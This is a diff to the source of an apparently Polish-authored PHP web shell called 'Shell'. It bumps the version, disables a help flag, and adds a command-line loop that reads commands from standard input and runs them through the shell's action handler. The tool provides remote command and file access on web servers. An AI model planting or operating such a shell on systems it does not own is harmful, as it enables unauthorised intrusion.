@@ -32,7 +32,7 @@ class Shell
 	/**
 	 * Wersja
 	 */
-	const VERSION = '0.50 b120126';
+	const VERSION = '0.50 b120126-dev';
 
 	/**
 	 * Help, natywne polecenia
@@ -900,6 +900,11 @@ DATA;
 			$sOutput .= $sModuleCmd . ' - ' . $oModule -> getHelp() . "\r\n\r\n\r\n";
 		}
 
+		/**
+		 * Wylaczenie uzycia pliku pomocy dna natywnych polecen
+		 */
+		$this -> bHelp = FALSE;
+
 		return htmlspecialchars( substr( $sOutput, 0, -6 ) );
 	}
 
@@ -1661,7 +1666,7 @@ return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8
 	 * Wyswietlanie strony
 	 *
 	 * @access private
-	 * @return string
+	 * @return void
 	 */
 	public function get()
 	{
@@ -1697,6 +1702,27 @@ return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8
 				}
 
 				file_put_contents( $sAuthFilename, $this -> encode( sha1( $this -> sAuth . Request::getServer( 'REMOTE_ADDR' ), TRUE ) ) );
+			}
+		}
+
+		/**
+		 * CLI
+		 */
+		if( PHP_SAPI === 'cli' )
+		{
+			/**
+			 * Naglowek
+			 */
+			printf( "\r\n   .  .          ,          __..     ..\r\n   |\ | _  _.._ -+- _ ._.  (__ |_  _ ||\r\n   | \|(/,(_][_) | (/,[    .__)[ )(/,||\r\n             |          v%s\r\n\r\n\r\n", self::VERSION );
+
+			if( count( $GLOBALS['argv'] ) === 1 )
+			{
+				for(;;)
+				{
+					printf( '>> ns@127.0.0.1:%s$', getcwd() );
+					echo $this -> getActionBrowser( rtrim( fgets( STDIN ) ) );
+				}
+				return ;
 			}
 		}
 
